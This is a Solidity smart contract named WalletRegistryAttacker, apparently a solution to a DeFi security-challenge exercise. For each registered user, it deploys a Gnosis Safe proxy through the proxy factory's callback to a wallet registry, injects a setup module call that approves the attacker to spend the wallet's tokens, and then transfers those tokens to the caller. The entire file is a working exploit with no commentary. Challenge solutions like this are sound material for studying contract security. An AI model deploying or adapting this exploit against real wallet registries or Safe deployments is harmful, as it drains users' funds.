// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "hardhat/console.sol";

contract WalletRegistryAttacker {
    address singleton;
    address proxyFactory;
    address walletRegistry;
    address[] users;
    address tokenAddress;
    GnosisSafeProxy proxyAddress;

    constructor(
        address _singleton,
        address _proxyFactory,
        address _walletRegistry,
        address _tokenAddress,
        address[] memory _users
    ) {
        singleton = _singleton;
        proxyFactory = _proxyFactory;
        walletRegistry = _walletRegistry;
        tokenAddress = _tokenAddress;
        users = _users;
    }

    function approve(
        address _attacker,
        address token,
        uint256 value
    ) external {
        IERC20(token).approve(_attacker, value);
        console.log("CONTRACT::: Approved!");
    }

    function attack() public {
        console.log("CONTRACT::: Attacking!");
        GnosisSafeProxyFactory Factory = GnosisSafeProxyFactory(proxyFactory);

        address[] memory victim = new address[](1);
        for (uint256 i = 0; i < users.length; i++) {
            victim[0] = users[i];
            // bytes memory tokenCallData = abi.encodeWithSignature("setupCallback()");
            bytes memory tokenCallData = abi.encodeWithSignature(
                "approve(address,address,uint256)",
                address(this),
                tokenAddress,
                10 ether
            );
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                victim,
                uint256(1),
                address(this),
                tokenCallData,
                address(0),
                address(0),
                0,
                address(0)
            );
            proxyAddress = Factory.createProxyWithCallback(
                singleton,
                initializer,
                42,
                IProxyCreationCallback(walletRegistry)
            );
            console.log("CONTRACT::: created safe!");

            uint256 approvedAmount = IERC20(tokenAddress).allowance(
                address(proxyAddress),
                address(this)
            );
            IERC20(tokenAddress).transferFrom(
                address(proxyAddress),
                msg.sender,
                approvedAmount
            );
            console.log("CONTRACT::: Sent amount:", approvedAmount);
        }
    }
}
